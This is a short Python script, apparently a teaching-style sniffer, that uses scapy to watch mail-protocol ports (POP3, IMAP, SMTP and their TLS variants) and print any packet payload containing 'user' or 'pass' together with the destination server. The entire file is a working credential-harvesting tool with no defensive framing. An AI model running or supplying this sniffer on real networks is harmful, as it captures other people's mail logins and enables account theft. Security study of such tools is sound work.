from scapy.all import *

def packet_callback(pkt):
    if pkt[TCP].payload:
        mail_pkt = str(pkt[TCP].payload)
        if "user" in mail_pkt.lower() or "pass" in mail_pkt.lower():
            print("[*] Server: %s "%pkt[IP].dst)
            print("[*] %s"%pkt[TCP].payload)
    
sniff(filter = "tcp port 109 or tcp port 465 or tcp port 995 or tcp port 993 or tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store = 0)
